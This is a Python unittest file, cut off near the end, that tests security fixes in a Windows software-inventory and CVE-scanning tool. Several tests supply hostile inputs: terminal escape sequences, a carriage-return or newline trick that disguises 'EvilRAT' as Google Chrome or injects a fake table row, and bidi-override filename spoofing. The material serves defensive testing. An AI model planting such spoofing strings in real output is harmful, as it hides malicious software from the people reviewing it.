"""
Security Tests for Software Enumerator

Tests to verify security fixes are working correctly:
1. API key environment variable support
2. Output sanitization (ANSI escape removal)
3. Generic User-Agent
4. Symlink protection
5. Error message sanitization
6. Audit logging
7. TOCTOU fixes (code path verification)
"""

import csv
import io
import logging
import msvcrt
import os
import stat
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock
import collections
import json
import time

# Import the module under test
import Software_Enumerator as se


class TestOutputSanitization(unittest.TestCase):
    """Test that output sanitization removes dangerous characters."""

    def test_removes_ansi_color_codes(self):
        """ANSI color codes should be stripped."""
        malicious = "\x1b[31mMalware\x1b[0m"
        result = se.sanitize_output(malicious)
        self.assertEqual(result, "Malware")

    def test_removes_cursor_movement(self):
        """ANSI cursor movement sequences should be stripped."""
        malicious = "\x1b[2J\x1b[HHidden"  # Clear screen + home cursor
        result = se.sanitize_output(malicious)
        self.assertEqual(result, "Hidden")

    def test_removes_osc_sequences(self):
        """OSC (Operating System Command) sequences should be stripped."""
        malicious = "\x1b]0;Fake Title\x07Real Text"
        result = se.sanitize_output(malicious)
        self.assertEqual(result, "Real Text")

    def test_removes_control_characters(self):
        """Non-line-break control characters should be stripped."""
        malicious = "Normal\x00\x01\x02\x03Text"
        result = se.sanitize_output(malicious)
        self.assertEqual(result, "NormalText")

    def test_line_breaks_and_tabs_become_spaces(self):
        """Newlines and tabs are replaced with spaces (output fields are single-line)."""
        text = "Line1\nLine2\tTabbed"
        result = se.sanitize_output(text)
        self.assertEqual(result, "Line1 Line2 Tabbed")

    def test_carriage_return_cannot_hide_text(self):
        """A CR must not let a name overwrite itself on screen."""
        result = se.sanitize_output("EvilRAT\rGoogle Chrome")
        self.assertNotIn("\r", result)
        self.assertEqual(result, "EvilRAT Google Chrome")

    def test_newline_cannot_inject_table_row(self):
        """A newline must not let a name inject a fake row into table output."""
        result = se.sanitize_output("EvilRAT\nGoogle Chrome | 131.0 | Google LLC")
        self.assertNotIn("\n", result)

    def test_all_vertical_whitespace_becomes_space(self):
        """VT, FF, NEL and Unicode line/paragraph separators become spaces."""
        for ch in ["\v", "\f", "\x85", " ", " "]:
            self.assertEqual(se.sanitize_output(f"a{ch}b"), "a b", f"U+{ord(ch):04X}")

    def test_removes_c1_control_characters(self):
        """C1 controls (0x80-0x9F) are removed, including 8-bit CSI sequences."""
        self.assertEqual(se.sanitize_output("x\x9b31my"), "xy")   # 8-bit CSI + params
        self.assertEqual(se.sanitize_output("a\x90b\x9fc"), "abc")

    def test_csi_private_parameters_leave_no_residue(self):
        """Sequences like ESC[?25l (hide cursor) are fully removed, not left as '[?25l'."""
        self.assertEqual(se.sanitize_output("A\x1b[?25lB"), "AB")
        self.assertEqual(se.sanitize_output("A\x1b[>4;1mB"), "AB")

    def test_removes_osc_terminated_by_st(self):
        """OSC sequences terminated by ST (ESC \\) are removed, not only BEL-terminated ones."""
        self.assertEqual(se.sanitize_output("A\x1b]0;Fake Title\x1b\\B"), "AB")

    def test_removes_two_byte_escape_sequences(self):
        """Two-byte escapes (ESC c reset, ESC 7 save cursor, ESC ( B charset) are removed whole,
        matching how a terminal would consume them."""
        self.assertEqual(se.sanitize_output("A\x1bcB"), "AB")
        self.assertEqual(se.sanitize_output("A\x1b7B"), "AB")
        self.assertEqual(se.sanitize_output("A\x1b(BC"), "AC")

    def test_non_string_input_is_stringified(self):
        """Non-string values (e.g. a REG_DWORD read from the registry) don't crash."""
        self.assertEqual(se.sanitize_output(20240101), "20240101")

    def test_handles_empty_string(self):
        """Empty strings should be handled gracefully."""
        self.assertEqual(se.sanitize_output(""), "")

    def test_handles_none(self):
        """None should be handled gracefully."""
        self.assertIsNone(se.sanitize_output(None))

    def test_complex_attack_string(self):
        """Complex attack strings combining multiple techniques."""
        # Attempt to: clear screen, move cursor, change title, hide text
        malicious = "\x1b[2J\x1b[H\x1b]0;Trusted App\x07\x1b[8mHidden\x1b[0mVisible"
        result = se.sanitize_output(malicious)
        self.assertNotIn("\x1b", result)
        self.assertIn("Visible", result)


    def test_removes_bidi_overrides(self):
        """Unicode bidirectional override characters should be stripped."""
        malicious = "safe\u202eexe.doc"
        result = se.sanitize_output(malicious)
        self.assertNotIn("\u202e", result)
        self.assertEqual(result, "safeexe.doc")

    def test_removes_all_bidi_characters(self):
        """All Unicode bidi control characters should be stripped."""
        bidi_chars = [
            "\u200e", "\u200f",  # LRM, RLM
            "\u202a", "\u202b", "\u202c", "\u202d", "\u202e",  # LRE..RLO
            "\u2066", "\u2067", "\u2068", "\u2069",  # LRI..PDI
        ]
        for char in bidi_chars:
            text = f"before{char}after"
            result = se.sanitize_output(text)
            self.assertEqual(result, "beforeafter",
                             f"Failed to strip U+{ord(char):04X}")

    def test_removes_zero_width_format_chars(self):
        """Zero-width format characters (Cf category) should be stripped."""
        text = "app\u200bname\ufeff.exe"
        result = se.sanitize_output(text)
        self.assertEqual(result, "appname.exe")


class TestApiKeyEnvironmentVariable(unittest.TestCase):
    """Test that API key can be read from environment variable."""

    def test_reads_from_environment(self):
        """API key should be read from NVD_API_KEY env var."""
        with patch.dict(os.environ, {"NVD_API_KEY": "test-key-12345"}):
            scanner = se.VulnerabilityScanner()
            self.assertEqual(scanner.api_key, "test-key-12345")

    def test_cli_arg_overrides_environment(self):
        """CLI argument should take precedence over env var."""
        with patch.dict(os.environ, {"NVD_API_KEY": "env-key"}):
            scanner = se.VulnerabilityScanner(api_key="cli-key")
            self.assertEqual(scanner.api_key, "cli-key")

    def test_none_when_not_set(self):
        """API key should be None when not set anywhere."""
        with patch.dict(os.environ, {}, clear=True):
            # Remove the key if it exists
            os.environ.pop("NVD_API_KEY", None)
            scanner = se.VulnerabilityScanner()
            self.assertIsNone(scanner.api_key)


class TestUserAgent(unittest.TestCase):
    """Test that User-Agent is generic and doesn't identify the tool."""

    def test_user_agent_is_generic(self):
        """User-Agent should not identify the tool as a security scanner."""
        scanner = se.VulnerabilityScanner()

        # Access the _query_nvd_api method to check headers
        # We need to mock urllib to capture the request
        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"vulnerabilities": []}'
            mock_response.__enter__ = MagicMock(return_value=mock_response)
            mock_response.__exit__ = MagicMock(return_value=False)
            mock_urlopen.return_value = mock_response

            try:
                scanner._query_nvd_api("test")
            except:
                pass  # We just want to capture the request

            # Verify the mock was actually called before checking headers
            self.assertTrue(mock_urlopen.called, "urlopen was never called — test is not exercising the code path")
            call_args = mock_urlopen.call_args
            request = call_args[0][0]
            user_agent = request.get_header('User-agent')

            # Should not contain identifying information
            self.assertNotIn("Software-Enumerator", user_agent or "")
            self.assertNotIn("Security", user_agent or "")
            self.assertNotIn("Audit", user_agent or "")


class TestSymlinkProtection(unittest.TestCase):
    """Test that symlinks are properly handled to prevent traversal."""

    def setUp(self):
        """Create a temporary directory structure for testing."""
        self.temp_dir = tempfile.mkdtemp()
        self.scanner = se.PortableAppScanner()

    def tearDown(self):
        """Clean up temporary directory."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_skips_symlinked_files(self):
        """Symlinked files should be skipped."""
        # Create a real exe (empty file for testing)
        real_dir = Path(self.temp_dir) / "real"
        real_dir.mkdir()
        real_exe = real_dir / "app.exe"
        real_exe.write_bytes(b"MZ")  # Minimal PE header start

        # Create a symlink directory with a symlink to the exe
        symlink_dir = Path(self.temp_dir) / "symlinks"
        symlink_dir.mkdir()

        try:
            symlink_exe = symlink_dir / "linked.exe"
            symlink_exe.symlink_to(real_exe)
        except OSError:
            self.skipTest("Cannot create symlinks (requires admin on Windows)")

        # Scan the symlink directory - should find nothing
        executables = self.scanner._find_executables(symlink_dir, max_depth=2)

        # The symlinked exe should not be in the results
        exe_names = [e.name for e in executables]
        self.assertNotIn("linked.exe", exe_names)

    def test_skips_symlinked_directories(self):
        """Symlinked directories should not be traversed."""
        # Create a real directory with an exe
        real_dir = Path(self.temp_dir) / "real_apps"
        real_dir.mkdir()
        real_exe = real_dir / "secret.exe"
        real_exe.write_bytes(b"MZ")

        # Create a scan directory with a symlink to real_dir
        scan_dir = Path(self.temp_dir) / "scan"
        scan_dir.mkdir()

        try:
            symlink_subdir = scan_dir / "linked_dir"
            symlink_subdir.symlink_to(real_dir, target_is_directory=True)
        except OSError:
            self.skipTest("Cannot create symlinks (requires admin on Windows)")

        # Scan should not follow the symlink
        executables = self.scanner._find_executables(scan_dir, max_depth=2)

        exe_names = [e.name for e in executables]
        self.assertNotIn("secret.exe", exe_names)


class TestErrorMessageSanitization(unittest.TestCase):
    """Test that error messages don't leak sensitive information."""

    def test_network_error_is_generic(self):
        """Network errors should not expose internal details."""
        scanner = se.VulnerabilityScanner()

        with patch('urllib.request.urlopen') as mock_urlopen:
            import urllib.error
            mock_urlopen.side_effect = urllib.error.URLError("Connection refused to internal.server.local:8080")

            with self.assertRaises(Exception) as context:
                scanner._query_nvd_api("test")

            error_msg = str(context.exception)
            # Should not contain the detailed reason
            self.assertNotIn("internal.server.local", error_msg)
            self.assertNotIn("8080", error_msg)
            self.assertNotIn("Connection refused", error_msg)
            # Should have a generic message
            self.assertIn("Unable to reach NVD API", error_msg)

    def test_http_error_hides_details(self):
        """HTTP errors should not expose full error responses."""
        scanner = se.VulnerabilityScanner()

        with patch('urllib.request.urlopen') as mock_urlopen:
            import urllib.error
            mock_error = urllib.error.HTTPError(
                "https://api.example.com/secret/path",
                500,
                "Internal Server Error with sensitive data",
                {},
                None
            )
            mock_urlopen.side_effect = mock_error

            with self.assertRaises(Exception) as context:
                scanner._query_nvd_api("test")

            error_msg = str(context.exception)
            # Should not contain sensitive details
            self.assertNotIn("sensitive", error_msg)
            self.assertNotIn("secret/path", error_msg)
            # Should indicate HTTP error code only
            self.assertIn("500", error_msg)


class TestAuditLogging(unittest.TestCase):
    """Test that audit logging works correctly."""

    def setUp(self):
        """Set up a temporary log file."""
        self.temp_log = tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False)
        self.temp_log.close()

        # Save original handlers and clear
        self._original_handlers = list(se.logger.handlers)
        se.logger.handlers.clear()

    def tearDown(self):
        """Clean up: close handlers, restore originals, remove temp file."""
        for handler in se.logger.handlers:
            handler.close()
        se.logger.handlers.clear()
        se.logger.handlers.extend(self._original_handlers)
        try:
            os.unlink(self.temp_log.name)
        except OSError:
            pass

    def test_log_file_created(self):
        """Log file should be created when specified."""
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        se.log_audit_event("TEST", "Test event")

        # Force flush
        for handler in se.logger.handlers:
            handler.flush()

        with open(self.temp_log.name, 'r') as f:
            content = f.read()

        self.assertIn("TEST", content)
        self.assertIn("Test event", content)

    def test_audit_event_includes_timestamp(self):
        """Audit events should include timestamps."""
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        se.log_audit_event("TEST", "Timestamp test")

        for handler in se.logger.handlers:
            handler.flush()

        with open(self.temp_log.name, 'r') as f:
            content = f.read()

        # Should have date format YYYY-MM-DD HH:MM:SS
        import re
        self.assertRegex(content, r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')

    def test_audit_event_includes_kwargs(self):
        """Audit events should include additional key-value pairs."""
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        se.log_audit_event("TEST", "KV test", user="testuser", count=42)

        for handler in se.logger.handlers:
            handler.flush()

        with open(self.temp_log.name, 'r') as f:
            content = f.read()

        self.assertIn("user=testuser", content)
        self.assertIn("count=42", content)

    def test_verbose_enables_debug(self):
        """Verbose mode should enable debug-level logging."""
        se.setup_logging(log_file=self.temp_log.name, verbose=True)
        se.logger.debug("Debug message test")

        for handler in se.logger.handlers:
            handler.flush()

        with open(self.temp_log.name, 'r') as f:
            content = f.read()

        self.assertIn("Debug message test", content)


class TestTOCTOUFixes(unittest.TestCase):
    """Test that TOCTOU fixes work correctly (code paths handle missing files)."""

    def test_chromium_manifest_handles_missing_file(self):
        """_parse_chromium_manifest should handle missing files gracefully."""
        scanner = se.BrowserExtensionScanner()

        # Try to parse a non-existent manifest
        fake_path = Path("/nonexistent/path/manifest.json")
        result = scanner._parse_chromium_manifest(fake_path, "test-id", "Chrome")

        # Should return None, not raise an exception
        self.assertIsNone(result)

    def test_localized_name_handles_missing_file(self):
        """_get_localized_name should handle missing locale files gracefully."""
        scanner = se.BrowserExtensionScanner()

        # Try to get localized name from non-existent directory
        fake_dir = Path("/nonexistent/extension/dir")
        result = scanner._get_localized_name(fake_dir, "__MSG_appName__")

        # Should return None, not raise an exception
        self.assertIsNone(result)

    def test_firefox_extensions_handles_missing_file(self):
        """_parse_firefox_extensions_json should handle missing files gracefully."""
        scanner = se.BrowserExtensionScanner()

        # Try to parse a non-existent extensions.json
        fake_path = Path("/nonexistent/profile/extensions.json")
        result = scanner._parse_firefox_extensions_json(fake_path)

        # Should return empty list, not raise an exception
        self.assertEqual(result, [])


class TestDataclassSecurity(unittest.TestCase):
    """Test that dataclasses handle malicious input safely."""

    def test_software_info_search_is_safe(self):
        """SoftwareInfo.matches_search should not be vulnerable to regex injection."""
        software = se.SoftwareInfo(
            name="Test App",
            version="1.0",
            publisher="Test Inc"
        )

        # These regex special characters should be treated as literals
        malicious_searches = [
            ".*",
            "^Test",
            "Test$",
            "Test|Malware",
            "(?:Test)",
            "[A-Z]",
        ]

        for search in malicious_searches:
            # Should not raise and should do literal matching
            try:
                result = software.matches_search(search)
                # ".*" should not match everything (if it did, regex is being used)
                if search == ".*":
                    self.assertFalse(result, "Regex patterns should not be interpreted")
            except Exception as e:
                self.fail(f"matches_search raised exception for '{search}': {e}")


class TestVersionMatching(unittest.TestCase):
    """Test CVE version matching logic."""

    def setUp(self):
        self.scanner = se.VulnerabilityScanner()

    def test_version_parse_standard(self):
        """Standard version string parses to integer tuple."""
        self.assertEqual(se.VulnerabilityScanner._parse_version("1.2.3"), (1, 2, 3))

    def test_version_parse_with_text(self):
        """Version with text suffix stops at non-numeric segment."""
        self.assertEqual(se.VulnerabilityScanner._parse_version("1.2.3-beta"), (1, 2, 3))

    def test_version_parse_empty(self):
        """Empty string returns empty tuple."""
        self.assertEqual(se.VulnerabilityScanner._parse_version(""), ())

    def test_version_in_range_basic(self):
        """Version within range returns True."""
        self.assertTrue(se.VulnerabilityScanner._version_in_range(
            (1, 5, 0), start_inc="1.0", end_exc="2.0"))

    def test_version_below_range(self):
        """Version below range returns False."""
        self.assertFalse(se.VulnerabilityScanner._version_in_range(
            (0, 9, 0), start_inc="1.0", end_exc="2.0"))

    def test_version_above_range(self):
        """Version above range returns False."""
        self.assertFalse(se.VulnerabilityScanner._version_in_range(
            (2, 1, 0), start_inc="1.0", end_exc="2.0"))

    def test_version_at_boundary_inclusive(self):
        """Version at inclusive start boundary returns True."""
        self.assertTrue(se.VulnerabilityScanner._version_in_range(
            (1, 0), start_inc="1.0", end_exc="2.0"))

    def test_version_at_boundary_exclusive(self):
        """Version at exclusive end boundary returns False."""
        self.assertFalse(se.VulnerabilityScanner._version_in_range(
            (2, 0), start_inc="1.0", end_exc="2.0"))

    def test_version_matches_with_cpe_data(self):
        """Version matching with proper CPE configuration data."""
        vuln_data = {
            "cve": {
                "configurations": [{
                    "nodes": [{
                        "cpeMatch": [{
                            "criteria": "cpe:2.3:a:vendor:product:*:*:*:*:*:*:*:*",
                            "versionStartIncluding": "1.0",
                            "versionEndExcluding": "2.5.3",
                            "vulnerable": True
                        }]
                    }]
                }]
            }
        }
        self.assertTrue(self.scanner._version_matches(vuln_data, "2.0.0"))
        self.assertFalse(self.scanner._version_matches(vuln_data, "3.0.0"))

    def test_version_matches_no_config(self):
        """Missing configurations returns True (conservative)."""
        vuln_data = {"cve": {}}
        self.assertTrue(self.scanner._version_matches(vuln_data, "1.0.0"))

    def test_version_matches_filters_out_unaffected(self):
        """Installed version outside all ranges returns False."""
        vuln_data = {
            "cve": {
                "configurations": [{
                    "nodes": [{
                        "cpeMatch": [{
                            "criteria": "cpe:2.3:a:vendor:product:*:*:*:*:*:*:*:*",
                            "versionStartIncluding": "1.0",
                            "versionEndExcluding": "1.5",
                            "vulnerable": True
                        }, {
                            "criteria": "cpe:2.3:a:vendor:product:*:*:*:*:*:*:*:*",
                            "versionStartIncluding": "2.0",
                            "versionEndExcluding": "2.3",
                            "vulnerable": True
                        }]
                    }]
                }]
            }
        }
        self.assertFalse(self.scanner._version_matches(vuln_data, "1.8.0"))

    def test_version_matches_malformed_input(self):
        """Malformed data should not crash."""
        # Completely wrong structure
        self.assertTrue(self.scanner._version_matches({}, "1.0"))
        # Configurations with empty nodes
        vuln_data = {"cve": {"configurations": [{"nodes": []}]}}
        self.assertTrue(self.scanner._version_matches(vuln_data, "1.0"))
        # None-like values
        self.assertTrue(self.scanner._version_matches({"cve": {}}, ""))


class TestCsvParsing(unittest.TestCase):
    """Test that CSV parsing with csv module handles edge cases."""

    def _parse_csv(self, text):
        """Helper: parse CSV text the same way get_store_apps does."""
        reader = csv.reader(io.StringIO(text))
        return list(reader)

    def test_parse_normal_csv(self):
        """Standard CSV row parsed correctly."""
        rows = self._parse_csv('Name,Version,Publisher,Location\nFoo,1.0,Bar,C:\\Apps')
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[1], ["Foo", "1.0", "Bar", "C:\\Apps"])

    def test_parse_quoted_values_with_commas(self):
        """Quoted values containing commas handled correctly."""
        rows = self._parse_csv('A,B\n"value,with,commas",other')
        self.assertEqual(rows[1][0], "value,with,commas")
        self.assertEqual(rows[1][1], "other")

    def test_parse_empty_fields(self):
        """Empty CSV fields produce empty strings."""
        rows = self._parse_csv('A,B,C\n,,')
        self.assertEqual(rows[1], ["", "", ""])

    def test_parse_escaped_quotes(self):
        """Escaped quotes inside fields handled correctly."""
        rows = self._parse_csv('A\n"He said ""hello"""')
        self.assertEqual(rows[1][0], 'He said "hello"')

    def test_parse_unicode(self):
        """Unicode characters in fields are preserved."""
        rows = self._parse_csv('Name\n\u00e9\u00e8\u00ea\u00eb')
        self.assertEqual(rows[1][0], "\u00e9\u00e8\u00ea\u00eb")


class TestSoftwareMappings(unittest.TestCase):
    """Test SOFTWARE_MAPPINGS coverage and format."""

    def test_known_software_has_mapping(self):
        """Common software names resolve to correct vendor/product."""
        mappings = se.VulnerabilityScanner.SOFTWARE_MAPPINGS
        self.assertEqual(mappings["google chrome"], ("google", "chrome"))
        self.assertEqual(mappings["wireshark"], ("wireshark", "wireshark"))
        self.assertEqual(mappings["virtualbox"], ("oracle", "virtualbox"))
        self.assertEqual(mappings["curl"], ("haxx", "curl"))

    def test_mapping_values_are_tuples(self):
        """All values in SOFTWARE_MAPPINGS are (vendor, product) tuples."""
        for key, value in se.VulnerabilityScanner.SOFTWARE_MAPPINGS.items():
            self.assertIsInstance(value, tuple, f"Mapping for '{key}' is not a tuple")
            self.assertEqual(len(value), 2, f"Mapping for '{key}' does not have 2 elements")
            self.assertIsInstance(value[0], str, f"Vendor for '{key}' is not a string")
            self.assertIsInstance(value[1], str, f"Product for '{key}' is not a string")

    def test_normalize_removes_architecture(self):
        """Architecture suffixes like (x64), (64-bit) are removed."""
        scanner = se.VulnerabilityScanner()
        self.assertNotIn("x64", scanner._normalize_software_name("MyApp (x64)"))
        self.assertNotIn("64-bit", scanner._normalize_software_name("MyApp (64-bit)"))

    def test_normalize_removes_version(self):
        """Version numbers in name are removed."""
        scanner = se.VulnerabilityScanner()
        result = scanner._normalize_software_name("MyApp 2.0.1")
        self.assertNotIn("2.0.1", result)


class TestLogRotation(unittest.TestCase):
    """Test that log rotation is configured correctly."""

    def setUp(self):
        self.temp_log = tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False)
        self.temp_log.close()
        se.logger.handlers = []

    def tearDown(self):
        se.logger.handlers = []
        try:
            os.unlink(self.temp_log.name)
        except Exception:
            pass

    def test_uses_rotating_handler(self):
        """setup_logging should create a RotatingFileHandler."""
        from logging.handlers import RotatingFileHandler
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        file_handlers = [h for h in se.logger.handlers if isinstance(h, RotatingFileHandler)]
        self.assertEqual(len(file_handlers), 1)

    def test_rotation_config(self):
        """RotatingFileHandler should have correct maxBytes and backupCount."""
        from logging.handlers import RotatingFileHandler
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        file_handlers = [h for h in se.logger.handlers if isinstance(h, RotatingFileHandler)]
        handler = file_handlers[0]
        self.assertEqual(handler.maxBytes, 5 * 1024 * 1024)
        self.assertEqual(handler.backupCount, 3)

    def test_log_file_permissions_preserved(self):
        """Log file permissions should still be set after setup."""
        se.setup_logging(log_file=self.temp_log.name, verbose=False)
        # On Windows chmod may not work the same, but the call should not raise
        self.assertTrue(os.path.exists(self.temp_log.name))


class TestCveLimitArg(unittest.TestCase):
    """Test that the CVE scan limit is configurable."""

    def test_default_limit_is_20(self):
        """scan_software_list should default to 20 items."""
        scanner = se.VulnerabilityScanner()
        # Create 30 software items with versions
        items = [
            se.SoftwareInfo(name=f"App{i}", version="1.0", publisher="Test")
            for i in range(30)
        ]
        with patch.object(scanner, 'scan_software', return_value=se.VulnerabilityResult(
            software_name="x", software_version="1.0"
        )):
            scanner.scan_software_list(items)
            self.assertEqual(scanner.scan_software.call_count, 20)

    def test_custom_limit_respected(self):
        """Passing limit=5 should limit to 5 items."""
        scanner = se.VulnerabilityScanner()
        items = [
            se.SoftwareInfo(name=f"App{i}", version="1.0", publisher="Test")
            for i in range(30)
        ]
        with patch.object(scanner, 'scan_software', return_value=se.VulnerabilityResult(
            software_name="x", software_version="1.0"
        )):
            scanner.scan_software_list(items, limit=5)
            self.assertEqual(scanner.scan_software.call_count, 5)

    def test_limit_capped_at_100(self):
        """Values > 100 should be clamped to 100."""
        scanner = se.VulnerabilityScanner()
        items = [
            se.SoftwareInfo(name=f"App{i}", version="1.0", publisher="Test")
            for i in range(150)
        ]
        with patch.object(scanner, 'scan_software', return_value=se.VulnerabilityResult(
            software_name="x", software_version="1.0"
        )):
            scanner.scan_software_list(items, limit=200)
            self.assertEqual(scanner.scan_software.call_count, 100)


class TestPortableAppFileLimit(unittest.TestCase):
    """Test file count safety limit in PortableAppScanner."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.scanner = se.PortableAppScanner()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_find_executables_respects_max_files(self):
        """_find_executables should stop at max_files."""
        # Create 20 fake .exe files
        for i in range(20):
            exe = Path(self.temp_dir) / f"app{i}.exe"
            exe.write_bytes(b"MZ")
        results = self.scanner._find_executables(Path(self.temp_dir), max_depth=2, max_files=10)
        self.assertEqual(len(results), 10)

    def test_default_limit_is_500(self):
        """Default max_files parameter should be 500."""
        import inspect
        sig = inspect.signature(self.scanner._find_executables)
        self.assertEqual(sig.parameters['max_files'].default, 500)


class TestSlidingWindowRateLimit(unittest.TestCase):
    """Test sliding-window rate limiter."""

    def test_rate_limiter_tracks_timestamps(self):
        """After N requests, deque should have N entries."""
        scanner = se.VulnerabilityScanner()
        scanner._rate_max = 10  # increase limit to avoid sleeping
        for _ in range(3):
            scanner._rate_limit()
        self.assertEqual(len(scanner._request_timestamps), 3)

    def test_rate_limiter_clears_old_timestamps(self):
        """Timestamps older than the window should be pruned."""
        scanner = se.VulnerabilityScanner()
        scanner._rate_max = 10
        # Add old timestamps manually
        old_time = time.time() - 60  # 60 seconds ago
        scanner._request_timestamps.append(old_time)
        scanner._request_timestamps.append(old_time + 1)
        # Call rate_limit which should prune old entries
        scanner._rate_limit()
        # Old entries should be removed, only the new one remains
        self.assertEqual(len(scanner._request_timestamps), 1)

    def test_rate_limiter_enforces_window(self):
        """Making too many fast requests should trigger sleep."""
        scanner = se.VulnerabilityScanner()
        scanner._rate_max = 2
        scanner._rate_window = 30.0
        # Fill up the window
        scanner._rate_limit()
        scanner._rate_limit()
        # Next call should need to sleep
        with patch('time.sleep') as mock_sleep:
            scanner._rate_limit()
            mock_sleep.assert_called_once()

    def test_http_429_retry(self):
        """HTTP 429 response should trigger a retry."""
        scanner = se.VulnerabilityScanner()
        scanner._rate_max = 100  # avoid rate limit sleep

        import urllib.error
        error_429 = urllib.error.HTTPError(
            "https://api.example.com", 429, "Too Many Requests", {}, None
        )

        mock_success = MagicMock()
        mock_success.read.return_value = b'{"vulnerabilities": []}'
        mock_success.__enter__ = MagicMock(return_value=mock_success)
        mock_success.__exit__ = MagicMock(return_value=False)

        with patch('urllib.request.urlopen', side_effect=[error_429, mock_success]) as mock_urlopen:
            with patch('time.sleep'):
                result = scanner._query_nvd_api("test")
                self.assertEqual(result, [])
                self.assertEqual(mock_urlopen.call_count, 2)


class TestEnhancedPermissions(unittest.TestCase):
    """Test enhanced browser extension permission analysis."""

    def test_detects_storage_permission(self):
        """'storage' should be flagged as sensitive."""
        ext = se.BrowserExtensionInfo(
            name="Test", version="1.0", browser="Chrome",
            extension_id="test", permissions=["storage"]
        )
        self.assertTrue(ext.has_sensitive_permissions())

    def test_detects_file_url_permission(self):
        """'file:///*' should be flagged as sensitive."""
        ext = se.BrowserExtensionInfo(
            name="Test", version="1.0", browser="Chrome",
            extension_id="test", permissions=["file:///*"]
        )
        self.assertTrue(ext.has_sensitive_permissions())

    def test_detects_notifications_permission(self):
        """'notifications' should be flagged as sensitive."""
        ext = se.BrowserExtensionInfo(
            name="Test", version="1.0", browser="Chrome",
            extension_id="test", permissions=["notifications"]
        )
        self.assertTrue(ext.has_sensitive_permissions())

    def test_get_sensitive_details_returns_matches(self):
        """get_sensitive_permission_details should return matched permissions."""
        ext = se.BrowserExtensionInfo(
            name="Test", version="1.0", browser="Chrome",
            extension_id="test",
            permissions=["storage", "tabs", "idle"]
        )
        details = ext.get_sensitive_permission_details()
        self.assertIn("storage", details)
        self.assertIn("tabs", details)
        self.assertNotIn("idle", details)

    def test_firefox_top_level_permissions(self):
        """Firefox top-level 'permissions' field should be captured."""
        scanner = se.BrowserExtensionScanner()
        # Create a mock extensions.json with top-level permissions
        addon_data = {
            "addons": [{
                "type": "extension",
                "id": "test@firefox",
                "version": "1.0",
                "active": True,
                "defaultLocale": {"name": "Test Ext", "description": ""},
                "userPermissions": {"permissions": ["tabs"], "origins": []},
                "permissions": ["storage", "notifications"],
            }]
        }
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(addon_data, f)
            f.flush()
            temp_path = f.name

        try:
            results = scanner._parse_firefox_extensions_json(Path(temp_path))
            self.assertEqual(len(results), 1)
            perms = results[0].permissions
            self.assertIn("tabs", perms)
            self.assertIn("storage", perms)
            self.assertIn("notifications", perms)
        finally:
            os.unlink(temp_path)


class TestBaselineLimits(unittest.TestCase):
    """Test that baseline loading enforces size and entry limits."""

    def test_rejects_oversized_baseline_file(self):
        """Baseline files larger than 50 MB should be rejected."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump({"version": "1.0", "software": []}, f)
            temp_path = f.name
        try:
            with patch('os.path.getsize', return_value=60 * 1024 * 1024):
                with self.assertRaises(ValueError) as ctx:
                    se.BaselineManager.load_baseline(temp_path)
                self.assertIn("too large", str(ctx.exception))
        finally:
            os.unlink(temp_path)

    def test_rejects_too_many_entries(self):
        """Baselines with more than 50,000 entries should be rejected."""
        baseline_data = {
            "version": "1.0",
            "software": [{"name": f"App{i}", "version": "1.0",
                         "publisher": "", "install_date": "",
                         "source": "Registry", "install_location": ""}
                        for i in range(50001)]
        }
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(baseline_data, f)
            temp_path = f.name
        try:
            with patch('os.path.getsize', return_value=1024):
                with self.assertRaises(ValueError) as ctx:
                    se.BaselineManager.load_baseline(temp_path)
                self.assertIn("50000", str(ctx.exception).replace(",", "").replace("_", ""))
        finally:
            os.unlink(temp_path)


class TestSoftwareExporter(unittest.TestCase):
    """Test SoftwareExporter output formats."""

    def _make_software(self, name="TestApp", version="1.0",
                       publisher="TestPub", source="Registry"):
        return se.SoftwareInfo(
            name=name, version=version, publisher=publisher,
            install_date="2025-01-01", source=source,
            install_location="C:\\Apps"
        )

    def test_to_json_produces_valid_json(self):
        """to_json() output should parse as valid JSON."""
        items = [self._make_software(), self._make_software("App2", "2.0")]
        result = se.SoftwareExporter.to_json(items)
        data = json.loads(result)
        self.assertIn("metadata", data)
        self.assertIn("software", data)
        self.assertEqual(len(data["software"]), 2)

    def test_to_json_metadata_fields(self):
        """JSON metadata should contain expected fields."""
        items = [self._make_software()]
        data = json.loads(se.SoftwareExporter.to_json(items))
        meta = data["metadata"]
        self.assertIn("generated_at", meta)
        self.assertIn("hostname", meta)
        self.assertIn("total_count", meta)
        self.assertEqual(meta["total_count"], 1)

    def test_to_csv_well_formed(self):
        """to_csv() should produce parseable CSV with correct header."""
        items = [self._make_software()]
        csv_output = se.SoftwareExporter.to_csv(items)
        reader = csv.DictReader(io.StringIO(csv_output))
        rows = list(reader)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["name"], "TestApp")
        self.assertEqual(rows[0]["version"], "1.0")

    def test_to_csv_handles_special_characters(self):
        """CSV should correctly quote fields with commas and quotes."""
        items = [self._make_software(name='App "Pro", v2', publisher="A, B & C")]
        csv_output = se.SoftwareExporter.to_csv(items)
        reader = csv.DictReader(io.StringIO(csv_output))
        rows = list(reader)
        self.assertEqual(rows[0]["name"], 'App "Pro", v2')
        self.assertEqual(rows[0]["publisher"], "A, B & C")


class TestBaselineManagerRoundtrip(unittest.TestCase):
    """Test BaselineManager save/load roundtrip and compare."""

    def setUp(self):
        self.temp_file = tempfile.NamedTemporaryFile(
            mode='w', suffix='.json', delete=False
        )
        self.temp_file.close()

    def tearDown(self):
        try:
            os.unlink(self.temp_file.name)
